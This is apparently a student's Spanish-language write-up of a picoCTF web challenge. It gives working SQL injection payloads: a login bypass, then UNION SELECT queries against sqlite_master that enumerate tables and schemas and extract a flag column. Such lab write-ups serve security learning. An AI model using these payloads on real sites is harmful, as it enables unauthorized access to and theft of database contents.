## Descripción
Can you find the flag on this website. Try to find the flag [here](http://saturn.picoctf.net:51239/).
## Solución
primero usamos una inyeccion sql con:
```
admin' or 1=1;
```
probamos con el nombre de usuario y al ver que no funciono lo probamos con la contraseña y asi pudimos acceder.
aqui apreciamos un buscadaor de una tabla de 3 columnas
![[Pasted image 20250924104337.png]]
al saber que son 3 columnas usamos el comando union para juntar los datos de las columnas y la ponemos como inyeccion sql en el buscador de la pagina.
```
ciudad' union select 1,2,3;
```
![[Pasted image 20250924104612.png]]
y ahora usamos la primer columna para saber la version del sql
```
ciudad' union select sqlite_version(),2,3;
```
![[Pasted image 20250924104912.png]]
y usamos una inyección sql de extracción string para conocer el nombre de las tablas:
```
ciudad' union select 1,2,tbl_name FROM sqlite_master WHERE type='table' ;
```
![[Pasted image 20250924105701.png]]
para descripir los atributos se usa esta inyeccion sql de extraccion string ,el cambio fue que  en la segunda columna pusimos sql para que nos desplegara una mejor descripcion de las tablas
```
ciudad' union select 1,sql,tbl_name FROM sqlite_master WHERE type='table' ;
```
![[Pasted image 20250924110631.png]]
ahora como sabemos que en la tabla more_table esta un atributo llamado flag deducimos que alli esta nuestra bandera por ello usamos otra inyeccion donde en la tercer columna pondremos flag para sacar los registros desde la tabla more_tables.
```
ciudad' union select 1,2,flag from more_table;
```
![[Pasted image 20250924110558.png]]
## Referencias
SQLite Injection: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md")